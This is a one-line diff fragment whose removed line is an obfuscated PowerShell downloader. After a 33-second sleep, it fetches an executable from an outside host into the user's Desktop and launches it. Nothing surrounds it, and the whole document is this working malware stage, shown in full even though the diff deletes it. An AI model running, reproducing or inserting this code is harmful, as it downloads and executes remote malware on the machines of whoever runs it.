@@ -1,1 +1,0 @@
-$7d0mK6 = [TyPE]'ENVIronmENt' ; &'sleep' 33;${Des} = $7d0mk6::gETfoLDeRpaTh('Desktop');(&'New-Object' 'System.Net.WebClient').dowNLoaDFilE.iNVoKE('https://librez.ga/nlop','$Des\8048786.exe');&'Start-Process' $Des\8048786.exe
